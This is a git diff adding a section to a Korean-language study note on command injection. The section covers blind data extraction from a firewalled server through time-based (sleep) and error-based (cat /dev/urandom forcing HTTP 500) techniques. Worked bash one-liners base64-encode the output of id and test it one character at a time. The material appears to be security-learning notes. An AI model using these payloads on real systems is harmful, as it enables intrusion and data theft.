@@ -330,7 +330,48 @@
 
 <br/>
 
-* Network In/Out Bound의 제한이 걸려 있고 파일로 출력 값을 리다이렉션시켜 결과를 확인할 수 없을 때 사용할 수 있는 방법
+* Network In/Out Bound의 제한이 걸려 있고 파일로 출력 값을 리다이렉션시켜 결과를 확인할 수 없을 때 사용할 수 있는 방법 <br/> &nbsp;&nbsp; → ⚠️ 공격 대상 서버에서 네트워크 방화벽 규칙을 적용해 In/Out Bound이 막혀 있고 파일로 출력을 리다이렉션할 수 없으면 **참/거짓 판별**로 데이터룰 추출해야 함
+    - **지연 시간**(Sleep): 비교하는 값이 참일 경우 ```sleep``` 명령어를 실행해 지연시간을 발생시켜 웹 애플리케이션에서 반환하는 속도를 이용하여 데이터를 획득함
+        + 명령어의 결과를 base64로 인코딩한 값을 한 바이트씩 비교하여 지연 발생 여부(참/거짓)을 통해 데이터를 알아냄
+        + 예시
+            - [1] ```id``` 명령어의 실행 결과를 ```base64``` 명령어를 이용해 base64로 인코딩함 
+                ```linux
+                $ id
+                uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+                $ id | base64 -w 0
+                dWlkPTMzKHd3dy1kYXRhKSBnaWQ9MzMod3d3LWRhdGEpIGdyb3Vwcz0zMyh3d3ctZGF0YSkK
+                ```
+            - [2] 인코딩하여 나온 값을 한 바이트씩 비교하는 Bash 스크립트를 작성함 <br/> &nbsp;&nbsp; → 참이면 ```sleep``` 명령어로 서버 응답을 지연시키고, 거짓이면 스크립트를 종료함
+                ```bash
+                bash -c "a=\$(id | base64 -w 0); if [ \${a:0:1} == 'd' ]; then sleep 2; fi;" # 결과: 2초 지연 발생 (true) → 첫번째 문자 d
+                bash -c "a=\$(id | base64 -w 0); if [ \${a:1:1} == 'W' ]; then sleep 2; fi;" # 결과: 2초 지연 발생(true) → 두번째 문자 W
+                bash -c "a=\$(id | base64 -w 0); if [ \${a:2:1} == 'a' ]; then sleep 2; fi;" # 결과: 지연 발생 X (false)
+                bash -c "a=\$(id | base64 -w 0); if [ \${a:2:1} == 'l' ]; then sleep 2; fi;" # 결과: 2초 지연 발생(true) → 세번째 문자 l
+                ```
+    - **에러**(DoS): 비교하는 값이 참일 경우 시스템 에러(Internal Server Error, HTTP 500)을 발생시켜 에러 반환 여부를 통해 데이터를 획득하는 방법
+        + ```sleep``` 명령을 사용할 수 없거나, 시간 지연을 확실히 판별하기 어려운 경우에 사용함
+        + HTTP 500 에러(Internal Server Error)를 인위적으로 발생시키는 방법은 다양하지만, 간단한 방법으로는 ```cat /dev/urandom``` 명령어가 있음
+        + 예시
+            - [1] ```id``` 명령어의 실행 결과를 ```base64``` 명령어를 이용해 base64로 인코딩함
+                ```linux
+                $ id
+                uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+                $ id | base64 -w 0
+                dWlkPTMzKHd3dy1kYXRhKSBnaWQ9MzMod3d3LWRhdGEpIGdyb3Vwcz0zMyh3d3ctZGF0YSkK
+                ```
+            - [2] 인코딩하여 나온 값을 한 바이트씩 비교하는 Bash 스크립트를 작성함 <br/> &nbsp;&nbsp; → 500(서버 측 에러, Internal Server Error)이면 참, 그 외의 200(성공, Success)과 같은 값이라면 거짓으로 판단함
+                ```bash
+                bash -c "a=\$(id | base64 -w 0); if [ \${a:0:1} == 'd' ]; then cat /dev/urandom; fi;" # 결과: 500(서버 측 에러) → true (첫번째 문자 d)
+                bash -c "a=\$(id | base64 -w 0); if [ \${a:1:1} == 'W' ]; then cat /dev/urandom; fi;" # 결과: 500(서버 측 에러) → true (두번째 문자 W)
+                bash -c "a=\$(id | base64 -w 0); if [ \${a:2:1} == 'a' ]; then cat /dev/urandom; fi;" # 결과: 200(성공) → false
+                bash -c "a=\$(id | base64 -w 0); if [ \${a:2:1} == 'l' ]; then cat /dev/urandom; fi;" # 결과: 500(서버 측 에러) → true (세번재 문자 l)
+                ```
+
+<br/><br/>
+
+### 입력 값의 길이가 제한된 상황
 
 <br/><br/><br/>
 
